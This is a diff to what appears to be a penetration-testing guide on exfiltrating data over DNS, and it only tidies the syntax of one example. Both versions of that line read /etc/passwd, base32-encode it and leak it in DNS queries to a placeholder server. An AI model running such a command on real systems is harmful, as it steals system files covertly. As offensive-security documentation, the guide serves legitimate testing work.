@@ -40,7 +40,7 @@ In the examples below: `<DNS Name>` is the random name provided by Burp Collabor
 ### Exfiltrate a file:
 
 ```
-cat /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
+base32 -w 63 < /etc/passwd | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
 ```
 
 To recover the file:
